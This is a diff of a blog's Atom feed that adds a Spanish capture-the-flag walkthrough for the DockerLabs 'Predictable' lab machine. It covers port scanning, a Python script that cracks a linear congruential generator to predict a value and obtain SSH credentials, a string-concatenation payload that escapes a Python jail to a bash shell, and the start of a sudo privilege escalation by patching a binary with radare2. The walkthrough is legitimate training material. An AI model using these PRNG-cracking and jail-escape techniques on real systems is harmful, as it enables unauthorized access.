@@ -1,4 +1,310 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2024-07-02T01:48:40+00:00</updated><id>/feed.xml</id><title type="html">murrusko</title><author><name>murrusko</name><email>murrusko@proton.me</email></author><entry><title type="html">accounting</title><link href="/posts/accounting/" rel="alternate" type="text/html" title="accounting" /><published>2024-07-01T00:00:00+00:00</published><updated>2024-07-01T00:00:00+00:00</updated><id>/posts/accounting</id><content type="html" xml:base="/posts/accounting/"><![CDATA[<p><img src="/assets/images/accounting/acc.jpg" alt="image" /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2024-07-02T03:01:27+00:00</updated><id>/feed.xml</id><title type="html">murrusko</title><author><name>murrusko</name><email>murrusko@proton.me</email></author><entry><title type="html">Predictable</title><link href="/posts/predictable/" rel="alternate" type="text/html" title="Predictable" /><published>2024-07-02T00:00:00+00:00</published><updated>2024-07-02T00:00:00+00:00</updated><id>/posts/predictable</id><content type="html" xml:base="/posts/predictable/"><![CDATA[<p><img src="/assets/images/predictable/pred.png" alt="image" /></p>
+
+<p>Estamos ante un docker que contiene una distribución Linux. Es de nivel muy difícil y es de la plataforma <a href="https://dockerlabs.es">dockerlabs</a>.</p>
+
+<h1 id="enumeración">Enumeración</h1>
+
+<p>Ponemos el docker en marcha con el <code class="language-plaintext highlighter-rouge">auto_deploy.sh</code> que trae el zip. Cuando termina de cargar nos indica la dirección IP de nuestra víctima, en nuestro caso es <code class="language-plaintext highlighter-rouge">172.17.0.2</code>.</p>
+
+<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> a nuestra máquina victima <code class="language-plaintext highlighter-rouge">172.17.0.2</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 172.17.0.2
+PORT     STATE SERVICE
+22/tcp   open  ssh
+1111/tcp open  lmsocialserver
+</code></pre></div></div>
+
+<p>Vemos que tiene los puertos 22 y 1111 abiertos. Vamos a realizar otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code> pero esta vez para detectar la versión del servicio que este corriendo, <code class="language-plaintext highlighter-rouge">-sV</code>, y para ejecutar los scripts por defecto para detectar vulnerabilidades, <code class="language-plaintext highlighter-rouge">-sC</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,1111 <span class="nt">-v</span> 172.17.0.2
+PORT     STATE SERVICE         VERSION
+22/tcp   open  ssh             OpenSSH 9.7p1 Debian 5 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   256 fa:76:8a:ad:3c:33:1b:58:65:ba:74:ca:8a:7b:03:33 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 bc:f7:8f:f4:2d:d6:c9:66:0f:a8:7c:79:32:af:a4:79 <span class="o">(</span>ED25519<span class="o">)</span>
+1111/tcp open  lmsocialserver?
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Server: Werkzeug/3.0.3 Python/3.11.9
+|     Date: Tue, 25 Jun 2024 23:57:02 GMT
+|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+|     Content-Length: 12161
+|     Vary: Cookie
+|     Set-Cookie: <span class="nv">session</span><span class="o">=</span>eyJzZWVkIjoxNzE5MzU5ODIyfQ.ZntZTg.hhPjeoeYGV9K7YuwoMZANlhLvKQ<span class="p">;</span> HttpOnly<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/
+|     Connection: close
+|     &lt;<span class="o">!</span><span class="nt">--</span>
+|     class prng_lcg:
+|     9223372036854775783
+|     __init__<span class="o">(</span>self, <span class="nv">seed</span><span class="o">=</span>None<span class="o">)</span>:
+|     self.state <span class="o">=</span> seed
+|     next<span class="o">(</span>self<span class="o">)</span>:
+|     self.state <span class="o">=</span> <span class="o">(</span>self.state <span class="k">*</span> self.m + self.c<span class="o">)</span> % self.n
+|     <span class="k">return </span>self.state
+|     <span class="k">return </span>int
+|     obtener_semilla<span class="o">()</span>:
+|     <span class="k">return </span>time.time_ns<span class="o">()</span>
+|     obtener_semilla_anterior<span class="o">()</span>:
+|     <span class="k">return </span>obtener_semilla<span class="o">()</span> - 1
+|     <span class="s1">'seed'</span> not <span class="k">in </span>session:
+|     session[<span class="s1">'seed'</span><span class="o">]</span> <span class="o">=</span> obtener_semilla<span class="o">()</span>
+|     prng_lcg<span class="o">(</span>session[<span class="s1">'seed'</span><span class="o">])</span>
+|     prng_lcg<span class="o">(</span>session[<span class="s1">'seed'</span><span class="o">])</span>
+|     semilla_anterior <span class="o">=</span> obtener_semilla_anterior<span class="o">()</span>
+|     &lt;<span class="o">!</span>DOCTYPE html&gt;
+|     &lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;</span>
+|     &lt;<span class="nb">head</span><span class="o">&gt;</span>
+|   Help: 
+|     &lt;<span class="o">!</span>DOCTYPE HTML&gt;
+|     &lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;</span>
+|     &lt;<span class="nb">head</span><span class="o">&gt;</span>
+|     &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"utf-8"</span><span class="o">&gt;</span>
+|     &lt;title&gt;Error response&lt;/title&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;h1&gt;Error response&lt;/h1&gt;
+|     &lt;p&gt;Error code: 400&lt;/p&gt;
+|     &lt;p&gt;Message: Bad request syntax <span class="o">(</span><span class="s1">'HELP'</span><span class="o">)</span>.&lt;/p&gt;
+|     &lt;p&gt;Error code explanation: 400 - Bad request syntax or unsupported method.&lt;/p&gt;
+|     &lt;/body&gt;
+|_    &lt;/html&gt;
+</code></pre></div></div>
+
+<p>Vemos que es un servidor de <code class="language-plaintext highlighter-rouge">Werkzeug/3.0.3 Python/3.11.9</code> y lo que parece parte del código que usa la aplicación de la web.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">prng_lcg</span><span class="p">:</span>
+    <span class="n">m</span> <span class="o">=</span> 
+    <span class="n">c</span> <span class="o">=</span>
+    <span class="n">n</span> <span class="o">=</span> <span class="mi">9223372036854775783</span>
+
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">seed</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="n">seed</span>
+
+    <span class="k">def</span> <span class="nf">next</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">state</span> <span class="o">*</span> <span class="n">self</span><span class="p">.</span><span class="n">m</span> <span class="o">+</span> <span class="n">self</span><span class="p">.</span><span class="n">c</span><span class="p">)</span> <span class="o">%</span> <span class="n">self</span><span class="p">.</span><span class="n">n</span>
+        <span class="k">return</span> <span class="n">self</span><span class="p">.</span><span class="n">state</span>
+
+<span class="bp">...</span>
+
+<span class="c1"># return int
+</span><span class="k">def</span> <span class="nf">obtener_semilla</span><span class="p">():</span>
+    <span class="k">return</span> <span class="n">time</span><span class="p">.</span><span class="nf">time_ns</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">obtener_semilla_anterior</span><span class="p">():</span>
+    <span class="k">return</span> <span class="nf">obtener_semilla</span><span class="p">()</span> <span class="o">-</span> <span class="mi">1</span>
+<span class="bp">...</span>
+
+<span class="k">if</span> <span class="sh">'</span><span class="s">seed</span><span class="sh">'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
+        <span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">seed</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="nf">obtener_semilla</span><span class="p">()</span>
+<span class="n">gen</span> <span class="o">=</span> <span class="nf">prng_lcg</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">seed</span><span class="sh">'</span><span class="p">])</span>
+
+<span class="bp">...</span>
+
+<span class="n">gen</span> <span class="o">=</span> <span class="nf">prng_lcg</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">seed</span><span class="sh">'</span><span class="p">])</span>
+<span class="n">semilla_anterior</span> <span class="o">=</span> <span class="nf">obtener_semilla_anterior</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<p>Buscando vemos que se trata de un script para la creación de números usando un <a href="https://en.wikipedia.org/wiki/Linear_congruential_generator">Linear_congruential_generator</a>. Para generar los números nos hace falta conocer los valores de <code class="language-plaintext highlighter-rouge">m</code> (multiplicador) y <code class="language-plaintext highlighter-rouge">c</code> (incremento). El valor de <code class="language-plaintext highlighter-rouge">n</code> (modulo) es conocido para nosotros, <code class="language-plaintext highlighter-rouge">9223372036854775783</code> . Buscando como hacer reversing a LCG he encontrado esta url <a href="https://tailcall.net/posts/cracking-rngs-lcgs/">https://tailcall.net/posts/cracking-rngs-lcgs/</a> que muestra como poder obtener los valores conociendo valores consecutivos.</p>
+
+<p>Creamos el siguiente script en python para calcular los valores de <code class="language-plaintext highlighter-rouge">m</code> y <code class="language-plaintext highlighter-rouge">c</code>:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">argparse</span>
+
+<span class="k">def</span> <span class="nf">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="nf">return </span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">g</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="nf">egcd</span><span class="p">(</span><span class="n">b</span> <span class="o">%</span> <span class="n">a</span><span class="p">,</span> <span class="n">a</span><span class="p">)</span>
+        <span class="nf">return </span><span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="n">y</span> <span class="o">-</span> <span class="p">(</span><span class="n">b</span> <span class="o">//</span> <span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="n">x</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">modinv</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
+    <span class="n">g</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="nf">egcd</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">g</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">x</span> <span class="o">%</span> <span class="n">n</span>
+
+<span class="k">def</span> <span class="nf">crack_unknown_multiplier</span><span class="p">(</span><span class="n">modulus</span><span class="p">,</span> <span class="n">s0</span><span class="p">,</span> <span class="n">s1</span><span class="p">,</span> <span class="n">s2</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">s1</span> <span class="o">&lt;=</span> <span class="n">s0</span> <span class="ow">or</span> <span class="n">s0</span> <span class="o">&lt;=</span> <span class="n">s2</span><span class="p">:</span>
+       <span class="k">raise</span> <span class="nc">ValueError</span><span class="p">(</span><span class="sh">"</span><span class="s">s1 debe ser mayor que s0, y s0 debe ser mayor que s2</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">multiplier</span> <span class="o">=</span> <span class="p">(</span><span class="n">s2</span> <span class="o">-</span> <span class="n">s1</span><span class="p">)</span> <span class="o">*</span> <span class="nf">modinv</span><span class="p">(</span><span class="n">s1</span> <span class="o">-</span> <span class="n">s0</span><span class="p">,</span> <span class="n">modulus</span><span class="p">)</span> <span class="o">%</span> <span class="n">modulus</span>
+    <span class="n">increment</span> <span class="o">=</span> <span class="p">(</span><span class="n">s1</span> <span class="o">-</span> <span class="n">s0</span><span class="o">*</span><span class="n">multiplier</span><span class="p">)</span> <span class="o">%</span> <span class="n">modulus</span>
+    <span class="k">return</span> <span class="n">modulus</span><span class="p">,</span> <span class="n">multiplier</span><span class="p">,</span> <span class="n">increment</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
+    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="nc">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="sh">'</span><span class="s">Crack LCG</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">--n</span><span class="sh">'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Modulus</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">--s0</span><span class="sh">'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Valor 0</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">--s1</span><span class="sh">'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Valor 1</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">--s2</span><span class="sh">'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Valor 2</span><span class="sh">'</span><span class="p">)</span>
+
+    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="nf">parse_args</span><span class="p">()</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">modulus</span><span class="p">,</span> <span class="n">multiplier</span><span class="p">,</span> <span class="n">increment</span> <span class="o">=</span> <span class="nf">crack_unknown_multiplier</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">n</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">s0</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">s1</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">s2</span><span class="p">)</span>
+
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Modulus(n): </span><span class="si">{</span><span class="n">modulus</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Multiplier(m): </span><span class="si">{</span><span class="n">multiplier</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Increment(c): </span><span class="si">{</span><span class="n">increment</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+    <span class="k">except</span> <span class="nb">ValueError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Error: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h1 id="intrusión">Intrusión</h1>
+
+<p>Entramos a la web y tenemos que encontrar 3 valores consecutivos donde <code class="language-plaintext highlighter-rouge">s1 &gt; s0</code> y <code class="language-plaintext highlighter-rouge">s1 &gt; s2</code>.</p>
+
+<p><img src="/assets/images/predictable/1.png" alt="image" /></p>
+
+<p>Ejecutamos el script introduciendo los valores como argumentos y nos da como resultado lo siguiente:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python main.py <span class="nt">--n</span> 9223372036854775783 <span class="nt">--s0</span> 5042010115239285411 <span class="nt">--s1</span> 5691797266751657494 <span class="nt">--s2</span> 2989723807668403001
+Modulus<span class="o">(</span>n<span class="o">)</span>: 9223372036854775783
+Multiplier<span class="o">(</span>m<span class="o">)</span>: 81853448938945944
+Increment<span class="o">(</span>c<span class="o">)</span>: 7382843889490547368
+</code></pre></div></div>
+
+<p>Buscamos el número 99:</p>
+
+<p><img src="/assets/images/predictable/2.png" alt="image" /></p>
+
+<p>Creamos el siguiente script para la creación del número 100 con los valores recién calculados:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">argparse</span>
+
+<span class="c1"># Define the other constants
+</span><span class="n">m</span> <span class="o">=</span> <span class="mi">81853448938945944</span>
+<span class="n">c</span> <span class="o">=</span> <span class="mi">7382843889490547368</span>
+<span class="n">n</span> <span class="o">=</span> <span class="mi">9223372036854775783</span>
+
+<span class="c1"># Create an ArgumentParser object
+</span><span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="nc">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="sh">'</span><span class="s">Calcula el número 100 usando LCG</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="c1"># Add an argument for s99 with a short option name (-s99)
+</span><span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">-s99</span><span class="sh">'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Valor 99</span><span class="sh">'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+
+<span class="c1"># Parse the command-line arguments
+</span><span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="nf">parse_args</span><span class="p">()</span>
+
+<span class="c1"># Extract the value of s99 from the parsed arguments
+</span><span class="n">s99</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">s99</span>
+
+<span class="c1"># Perform the calculation
+</span><span class="n">s100</span> <span class="o">=</span> <span class="p">(</span><span class="n">s99</span> <span class="o">*</span> <span class="n">m</span> <span class="o">+</span> <span class="n">c</span><span class="p">)</span> <span class="o">%</span> <span class="n">n</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Valor 100: </span><span class="si">{</span><span class="n">s100</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Lo ejecutamos:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span> <span class="n">python</span> <span class="n">s100</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">s99</span> <span class="mi">2925996709184014603</span>
+<span class="n">Valor</span> <span class="mi">100</span><span class="p">:</span> <span class="mi">707173620968215045</span>
+</code></pre></div></div>
+
+<p>E introducimos el valor en la web para obtener las credenciales de acceso:</p>
+
+<p><img src="/assets/images/predictable/3.png" alt="image" /></p>
+
+<p>Una vez obtenidas las credenciales nos conectamos a la máquina por <code class="language-plaintext highlighter-rouge">ssh</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh mash@172.17.0.2
+mash@172.17.0.2<span class="s1">'s password:
+Linux predictable 6.8.11-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.8.11-1kali2 (2024-05-30) x86_64
+....
+
+</span></code></pre></div></div>
+
+<p>Nos avisa de que estamos enjaulados en una jaula de python:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Romper LCG y predecir numeros es divertido
+______________________________________________________________________
+Ahora escapa de mi pyjail
+<span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>Probamos a ver que palabras están prohibidas o bloqueadas:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> import 
++Block: import
+<span class="o">&gt;</span> os
+Block: os
+<span class="o">&gt;</span> <span class="s1">'imp'</span>+<span class="s1">'ort'</span>
+import
+</code></pre></div></div>
+
+<p>Vemos que las palabras <code class="language-plaintext highlighter-rouge">import</code> y <code class="language-plaintext highlighter-rouge">os</code> están bloqueadas, pero <code class="language-plaintext highlighter-rouge">'imp'+'ort'</code> no. Ejecutamos <code class="language-plaintext highlighter-rouge">globals()</code> para ver variables globales del módulo actual, junto con sus valores. La mayoría de los modulos de python tienen disponible de forma global el módulo <code class="language-plaintext highlighter-rouge">__builtins__</code>, y como vemos, está disponible. Ejecutamos <code class="language-plaintext highlighter-rouge">globals()['__builtins__']</code> y vemos que nos deja:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> globals<span class="o">()</span>
+<span class="o">{</span><span class="s1">'__name__'</span>: <span class="s1">'__main__'</span>, <span class="s1">'__doc__'</span>: None, <span class="s1">'__package__'</span>: None, <span class="s1">'__loader__'</span>: &lt;_frozen_importlib_external.SourceFileLoader object at 0x7f4d31e8aed0&gt;, <span class="s1">'__spec__'</span>: None, <span class="s1">'__annotations__'</span>: <span class="o">{}</span>, <span class="s1">'__builtins__'</span>: &lt;module <span class="s1">'builtins'</span> <span class="o">(</span>built-in<span class="o">)&gt;</span>, <span class="s1">'__file__'</span>: <span class="s1">'/usr/bin/jail'</span>, <span class="s1">'__cached__'</span>: None, <span class="s1">'signal'</span>: &lt;module <span class="s1">'signal'</span> from <span class="s1">'/usr/lib/python3.11/signal.py'</span><span class="o">&gt;</span>, <span class="s1">'banner'</span>: &lt;<span class="k">function </span>banner at 0x7f4d31e304a0&gt;, <span class="s1">'main'</span>: &lt;<span class="k">function </span>main at 0x7f4d31c447c0&gt;<span class="o">}</span>
+<span class="o">&gt;</span> globals<span class="o">()[</span><span class="s1">'__builtins__'</span><span class="o">]</span>
+&lt;module <span class="s1">'builtins'</span> <span class="o">(</span>built-in<span class="o">)&gt;</span>
+</code></pre></div></div>
+
+<p>Para poder ejecutar un comando de bash en python necesitamos importar el modulo os .system . En la url <a href="https://docs.python.org/3/library/functions.html">https://docs.python.org/3/library/functions.html</a> vemos que está disponible la la función <code class="language-plaintext highlighter-rouge">__import__</code> . Como hemos visto antes, la palabra import esta bloqueada, asi que tenemos que partir la palabra y concatenarla con el signo +. Después con la función <code class="language-plaintext highlighter-rouge">getattr(objeto, nombre)</code> cargamos en el objeto la funcion que le indicamos, en este caso <code class="language-plaintext highlighter-rouge">getattr(globals()['__builtins__'], '__import__’)</code>. Después solo nos quedaría cargar el módulo <code class="language-plaintext highlighter-rouge">os</code> con <code class="language-plaintext highlighter-rouge">getattr(globals()['__builtins__'], '__im'+'port__')('o'+'s')</code></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># https://docs.python.org/3/library/functions.html
+</span><span class="o">&gt;</span> <span class="nf">getattr</span><span class="p">(</span><span class="nf">globals</span><span class="p">()[</span><span class="sh">'</span><span class="s">__builtins__</span><span class="sh">'</span><span class="p">],</span> <span class="sh">'</span><span class="s">__im</span><span class="sh">'</span><span class="o">+</span><span class="sh">'</span><span class="s">port__</span><span class="sh">'</span><span class="p">)</span>
+<span class="o">&lt;</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span> <span class="n">function</span> <span class="nb">__import__</span><span class="o">&gt;</span>
+
+<span class="c1"># https://docs.python.org/3/library/functions.html#import__
+</span><span class="o">&gt;</span> <span class="nf">getattr</span><span class="p">(</span><span class="nf">globals</span><span class="p">()[</span><span class="sh">'</span><span class="s">__builtins__</span><span class="sh">'</span><span class="p">],</span> <span class="sh">'</span><span class="s">__im</span><span class="sh">'</span><span class="o">+</span><span class="sh">'</span><span class="s">port__</span><span class="sh">'</span><span class="p">)(</span><span class="sh">'</span><span class="s">o</span><span class="sh">'</span><span class="o">+</span><span class="sh">'</span><span class="s">s</span><span class="sh">'</span><span class="p">)</span>
+<span class="o">&lt;</span><span class="n">module</span> <span class="sh">'</span><span class="s">os</span><span class="sh">'</span> <span class="p">(</span><span class="n">frozen</span><span class="p">)</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>Para terminar solo nos queda ejecutar el comando <strong>bash</strong> para obtener la shell. Para ello primero cargamos <code class="language-plaintext highlighter-rouge">system</code> con <code class="language-plaintext highlighter-rouge">getattr</code> y luego <code class="language-plaintext highlighter-rouge">bash</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># https://docs.python.org/3/library/os.html</span>
+<span class="o">&gt;</span> getattr<span class="o">(</span>getattr<span class="o">(</span>globals<span class="o">()[</span><span class="s1">'__builtins__'</span><span class="o">]</span>, <span class="s1">'__im'</span>+<span class="s1">'port__'</span><span class="o">)(</span><span class="s1">'o'</span>+<span class="s1">'s'</span><span class="o">)</span>, <span class="s1">'sys'</span>+<span class="s1">'tem'</span><span class="o">)(</span><span class="s1">'bash'</span><span class="o">)</span>
+mash@predictable:~<span class="nv">$ </span><span class="nb">hostname
+</span>predictable
+mash@predictable:~<span class="nv">$ </span>
+</code></pre></div></div>
+<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>
+
+<p>Una vez dentro del sistema como mash miramos con <code class="language-plaintext highlighter-rouge">sudo -l</code> para vez que comandos puede ejecutar como <strong>root</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mash@predictable:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>mash on predictable:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin, use_pty
+
+User mash may run the following commands on predictable:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /opt/shell
+</code></pre></div></div>
+
+<p>Si lo ejecutamos nos indica como se usa y como ver una <em>pista:</em></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mash@predictable:~<span class="nv">$ </span><span class="nb">sudo</span> /opt/shell 
+Uso: ./shell input
+Pista: ./shell <span class="nt">-h</span>
+</code></pre></div></div>
+
+<p>La pista es la siguiente:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mash@predictable:~<span class="nv">$ </span><span class="nb">sudo</span> /opt/shell <span class="nt">-h</span>
+¿Sabias que EI_VERSION puede tener diferentes valores?. radare2 esta instalado
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">Radare2</code> es un framework de ingeniería inversa.</p>
+
+<p>De aquí en adelante he necesitado seguir el writeup de su creador, recomendable leerlo: <a href="https://ic4rta.github.io/docs/Dockerlabs/Predictable/">https://ic4rta.github.io/docs/Dockerlabs/Predictable/</a></p>
+
+<p>Parcheamos el binario:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mash@predictable:/opt<span class="nv">$ </span>r2 <span class="nt">-w</span> shell 
+WARN: Relocs has not been applied. Please use <span class="sb">`</span><span class="nt">-e</span> bin.relocs.apply<span class="o">=</span><span class="nb">true</span><span class="sb">`</span> or <span class="sb">`</span><span class="nt">-e</span> bin.cache<span class="o">=</span><span class="nb">true</span><span class="sb">`</span> next <span class="nb">time</span>
+<span class="o">[</span>0x000010a0]&gt; s 6
+<span class="o">[</span>0x00000006]&gt; wx 0x13
+<span class="o">[</span>0x00000006]&gt; q
